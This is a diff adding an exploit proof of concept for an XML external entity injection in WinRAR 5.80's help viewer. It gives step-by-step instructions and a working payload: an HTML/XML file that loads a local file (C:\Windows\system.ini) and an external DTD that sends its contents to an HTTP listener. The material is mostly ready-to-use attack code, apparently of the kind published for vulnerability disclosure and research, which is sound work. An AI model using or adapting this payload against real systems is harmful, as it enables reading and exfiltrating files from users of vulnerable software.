@@ -1,0 +1,38 @@
+# Exploit Title: winrar 5.80 - XML External Entity Injection
+# Exploit Author: hyp3rlinx
+# Vendor Homepage: https://win-rar.com/fileadmin/winrar-versions/winrar-x64-58b2.exe
+# Version: 5.80
+# Tested on: Microsoft Windows Version 10.0.18362.418 64bit
+
+# POC
+
+1- python -m SimpleHTTPServer (listens Port 8000)
+2- open winrar or any file.rar
+3- help
+4- help topics
+5- Drag the exploit to the window
+
+
+html file
+
+<htmlL>
+<body>
+<xml>
+<?xml version="1.0"?>
+<!DOCTYPE flavios [ 
+<!ENTITY % file SYSTEM "C:\Windows\system.ini">
+<!ENTITY % dtd SYSTEM "http://127.0.0.1:8800/start.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+</xml>
+</body>
+</html>
+
+
+
+==============================
+start.dtd
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:8800?%file;'>">
+%all;
